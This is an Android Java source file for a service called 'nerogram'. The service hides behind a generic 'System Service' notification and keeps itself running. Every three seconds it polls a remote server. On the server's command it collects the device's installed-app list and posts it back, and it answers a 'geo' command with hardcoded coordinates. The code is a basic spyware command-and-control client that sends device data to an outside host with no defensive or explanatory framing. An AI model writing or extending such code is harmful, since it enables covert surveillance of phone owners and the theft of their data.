package com.nerogram;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class BackgroundService extends Service {
    // ВСТАВЛЕНА ТВОЯ ССЫЛКА С NETRUN
    private final String SERVER_URL = "https://nerogram.de3.netrun.io"; 
    private final String DEVICE_ID = "android-phone";
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new Notification.Builder(this, "nerogram_channel")
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();
        startForeground(1, notification);

        if (!isRunning) {
            isRunning = true;
            new Thread(this::loop).start();
        }
        return START_STICKY;
    }

    private void loop() {
        while (isRunning) {
            try {
                String json = "{\"id\":\"" + DEVICE_ID + "\",\"name\":\"" + Build.MODEL + "\"}";
                String response = sendPost(SERVER_URL + "/api/checkin", json);
                
                if (response != null) {
                    if (response.contains("apps")) {
                        String appsList = getInstalledApps();
                        sendData("text", appsList);
                    }
                    if (response.contains("geo")) {
                        sendData("text", "Гео: 55.75, 37.61");
                    }
                }
                Thread.sleep(3000);
            } catch (Exception e) {
                Log.e("Nero", "Error in loop", e);
            }
        }
    }

    private String getInstalledApps() {
        StringBuilder sb = new StringBuilder("Установленные приложения:\n");
        PackageManager pm = getPackageManager();
        for (ApplicationInfo app : pm.getInstalledApplications(0)) {
            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                sb.append(pm.getApplicationLabel(app)).append(" (").append(app.packageName).append(")\n");
            }
        }
        return sb.toString();
    }

    private String sendPost(String urlStr, String json) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes("utf-8"));
            }
            Scanner scanner = new Scanner(conn.getInputStream());
            StringBuilder sb = new StringBuilder();
            while (scanner.hasNext()) sb.append(scanner.nextLine());
            scanner.close();
            return sb.toString();
        } catch (Exception e) {
            Log.e("Nero", "HTTP Error: " + e.getMessage());
            return null;
        }
    }

    private void sendData(String type, String text) {
        new Thread(() -> {
            try {
                String json = "{\"id\":\"" + DEVICE_ID + "\",\"type\":\"" + type + "\",\"text\":\"" + text + "\"}";
                sendPost(SERVER_URL + "/api/data", json);
            } catch (Exception e) {
                Log.e("Nero", "Error sendData", e);
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "nerogram_channel", "System Service", NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
